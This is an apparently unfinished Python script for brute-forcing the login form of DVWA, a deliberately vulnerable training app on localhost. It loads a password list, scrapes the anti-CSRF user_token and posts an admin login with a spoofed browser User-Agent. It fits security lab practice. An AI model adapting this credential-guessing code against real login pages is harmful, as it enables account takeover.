from http.client import responses

import requests
from bs4 import BeautifulSoup


# very basic brute force cracking method
# brute force cracking the login page of DVWA

class BasicBFC:
    url = ""
    method = ""
    username_list = []
    password_file = ""
    pwd_list = []

    def __init__(self, password_file, url, method, username_list):
        self.password_file = password_file
        self.url = url
        self.method = method
        self.username_list = username_list

    def _read_pwd_file(self):
        with open(self.password_file, "r") as f:
            for line in f:
                pwd = line.strip(' ').strip('\n').strip('\t')
                self.pwd_list.append(pwd)

    def start_cracking(self):
        self._read_pwd_file()
        print(self.pwd_list)
        print("start cracking ... ")


def get_user_token(text):
    """
    get user token from html content.
    like: 	<input type='hidden' name='user_token' value='12611d21980d8a0686a52c929a75b37e' />
    :param text:
    :return:
    """
    soup = BeautifulSoup(text, "html.parser")
    user_token = soup.find('input', {'name': 'user_token'})['value']

    return user_token


def main():
    """
    basic brute force cracking algorithm
    :return:
    """
    password_file = "../data/top1000_passwords.txt"
    url = "http://127.0.0.1:28080/login.php"
    method = "POST"
    username_list = ["admin"]
    s = requests.session()
    # basic_bfc = BasicBFC(password_file=password_file, url=url, method=method, username_list=username_list)


    # basic_bfc.start_cracking()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }

    response = s.get(url, headers=headers, data={}, timeout=1)
    user_token = get_user_token(response.text)
    print(response.text)
    print("user_token ----> " + user_token)
    data_with_token = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    print(data_with_token)
    request = s.post(url, headers=headers, data=data_with_token, timeout=1)
    print(request.status_code)
    print(request.text)




if __name__ == '__main__':
    main()